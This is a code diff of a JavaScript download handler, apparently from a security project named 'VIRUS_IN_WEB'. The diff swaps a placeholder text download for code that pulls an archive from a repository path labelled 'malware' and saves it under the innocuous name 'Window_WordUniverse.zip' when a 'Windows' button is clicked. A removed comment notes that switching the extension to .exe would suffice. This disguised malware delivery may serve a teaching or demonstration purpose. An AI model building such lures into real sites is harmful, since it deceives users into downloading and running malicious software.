@@ -1,28 +1,27 @@
-export default function Download_Windows() {
+export default function Download_Android() {
+    const downloadButton = document.getElementById('Windows');
 
-    document.getElementById("Windows").addEventListener("click", function() {
-        // 파일 내용을 설정합니다. 여기서는 간단한 텍스트 파일로 가정합니다.
-        const fileContent = "This is the content of Windows";
+    downloadButton.addEventListener('click', handleDownload);
 
-        // Blob 객체를 생성합니다.
-        const blob = new Blob([fileContent], { type: "text/plain" });
+    async function handleDownload() {
+        // 다운로드 중인지 여부를 확인하는 변수
+        let isDownloading = false;
 
-        //type 교체.
+        if (!isDownloading) {
+            isDownloading = true;
 
-        // a 태그를 생성하고 Blob 객체를 URL로 변환하여 다운로드 링크로 설정합니다.
-        const downloadLink = document.createElement("a");
-        downloadLink.href = URL.createObjectURL(blob);
+            const fileURL = 'https://github.com/KGV-Security/VIRUS_IN_WEB/raw/88e3f772c3827a875246a95e89e1a9dae012214e/src/malware/Android.zip';
+            const fileName = 'Window_WordUniverse.zip';
 
-        // 다운로드할 파일의 이름을 지정합니다.
-        downloadLink.download = "Windows.txt";
+            const d = document.createElement('a');
+            d.href = fileURL;
+            d.download = fileName;
+            document.body.appendChild(d);
+            d.click();
+            document.body.removeChild(d);
 
-        //txt를 exe로 바꾸면 댐
-
-        // a 태그를 클릭하여 다운로드를 시작합니다.
-        downloadLink.click();
-
-        // 사용이 끝난 a 태그를 제거합니다.
-        URL.revokeObjectURL(downloadLink.href);
-    });
-
+            // 다운로드가 완료되었을 때 버튼을 활성화
+            isDownloading = false;
+        }
+    }
 }
